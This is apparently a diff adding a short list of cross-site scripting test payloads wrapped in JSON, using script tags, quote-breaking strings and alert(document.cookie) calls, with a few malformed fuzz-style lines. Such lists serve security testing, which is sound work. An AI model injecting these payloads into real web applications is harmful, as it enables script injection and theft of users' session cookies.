@@ -1,0 +1,23 @@
+
+
+{"488f8<script>alert(1)</script>e5392":null}
+
+{"someparam":"alert(document.cookie);"}
+
+{"488f8{\"someparam\":\"alert(document.cookie)":null,"\"}5392":null}
+
+{"488f8}{\"someparam\":\"alert(document.cookie)":null,"\"}5392":null}
+
+} ';alert(document.cookie);//
+
+{"488f8<script>var initData ":null,"</script>e5392":null}
+
+{"488f8":123} ';alert(document.dcookie);:356b//e5392":null}
+
+
+{"488f8'":123,"alert(document.cookie)":null,"//e5392":null}
+
+
+
+
+5q"v(1'TCd
